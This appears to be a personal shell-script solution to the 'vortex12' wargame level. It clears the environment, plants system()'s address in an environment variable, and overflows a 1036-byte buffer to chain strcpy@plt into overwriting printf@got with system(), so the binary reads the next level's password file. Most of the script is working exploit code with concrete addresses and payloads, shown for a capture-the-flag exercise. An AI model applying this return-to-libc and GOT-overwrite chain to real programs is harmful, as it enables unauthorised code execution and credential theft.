#!/bin/sh
# In this challenge, stack is non-executable
readelf -l /vortex/vortex12 | grep STACK
# So we have to find another way to execute our shellcode

# We have to replace the printf address to point to system
# then the program will call system(%d)
# We can put script we want to execute (like 'cat /etc/vortex_pass/vortex13') in to file '%d'

# Clear the environment variables
unset $(env | awk -F= '{print $1}') && env;
# Set the environment variables
export PATH=/tmp/ballban_vortex12:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin;
export EGG=$(python3 -c "import sys; import struct; sys.stdout.buffer.write(struct.pack('<I', 0xf7dcd430) * 100)");

mkdir /tmp/ballban_vortex12
cd /tmp/ballban_vortex12

# Create file %d
tee %d << 'EOF'
cat /etc/vortex_pass/vortex13
EOF

# Get system address
gef /vortex/vortex12
p system # 0xf7dcd430

# Create check_env.c and compile
tee check_env.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char *argv[]) {
    printf("%p\n", getenv(argv[1]));
    return 0;
}
EOF
gcc -m32 check_env.c -o check_env

# Check address of EGG
./check_env EGG # 0xffffddc8 +x why +x I dont know why

# 1032 bytes Padding + ebp + eip(return address of unsafecode)
# Overwrite eip with strcpy@plt address to call strcpy
# Then pass printf@plt and EGG address to overwrite printf@got with system address
# strcpy(dest=EGG_address, egg_address)
# After that when program calls printf it will call system('/bin/sh')
# So it will be like
# Padding + ebp: 'A' * 1036 + strcpy@plt + printf@plt + EGG_address + printf@plt + /bin/sh_address

gef /vortex/vortex12
info functions strcpy@plt # 0x08049090  strcpy@plt
info functions printf@plt # 0x08049040  printf@plt
# EGG address -> system
# sleep
strace /vortex/vortex12 $(python3 -c "import sys; import struct; sys.stdout.buffer.write(b'A' * 1036 + struct.pack('<I', 0x08049090) + struct.pack('<I', 0x08049040) + struct.pack('<I', 0xffffdc7a) + struct.pack('<I', 0xf7e801c0))")


cat /etc/vortex_pass/vortex13
# Password: 

/vortex/vortex12 $(python3 run.py)